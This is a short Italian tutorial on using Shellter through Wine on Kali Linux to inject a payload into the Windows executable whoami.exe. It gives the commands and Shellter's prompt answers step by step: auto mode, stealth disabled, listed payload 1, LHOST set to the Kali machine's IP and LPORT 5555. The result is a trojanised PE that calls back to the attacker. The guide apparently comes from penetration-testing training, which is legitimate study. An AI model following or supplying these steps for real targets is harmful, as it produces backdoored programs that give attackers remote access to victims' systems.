# Utilizzo di Shellter con Wine su Kali Linux

Questa guida mostra come copiare un binario Windows, avviare Shellter tramite Wine ed eseguire l’iniezione di un payload in un file PE.

---

## 🔹 1. Avviare un terminale root e preparare il binario

```bash
sudo su
cd /usr/share/windows-binaries
ls
cp whoami.exe /opt/shellter/shellter
cd /opt/shellter/shellter
```

---

## 🔹 2. Aprire un nuovo terminale e lanciare Shellter

```bash
sudo wine shellter.exe




        1010101 01   10 0100110 10     01  11001001 0011101 001001
        11      10   01 00      01     01     01    10      11   10
        0010011 1110001 11011   11     10     00    10011   011001
             11 00   10 01      11     01     11    01      01   11
        0010010 11   00 0011010 100111 000111 00    1100011 01   10 v7.2
        www.ShellterProject.com                     Wine Mode




Choose Operation Mode - Auto/Manual (A/M/H): a
PE Target: whoami.exe
```

---

## 🔹 3. Inserimento dei parametri richiesti da Shellter

Durante l’operazione, comparirà una schermata nera, ma il terminale continuerà a chiedere valori da inserire:

```bash
Enable Stealth Mode? (Y/N/H): n
Use a listed payload or custom? (L/C/H): L
Select payload by index: 1
SET LHOST: <IP MACCHINA KALI>
SET LPORT: 5555
```

---

## ✔️ Fine procedura

A questo punto Shellter genererà il file PE modificato con il payload selezionato.

---

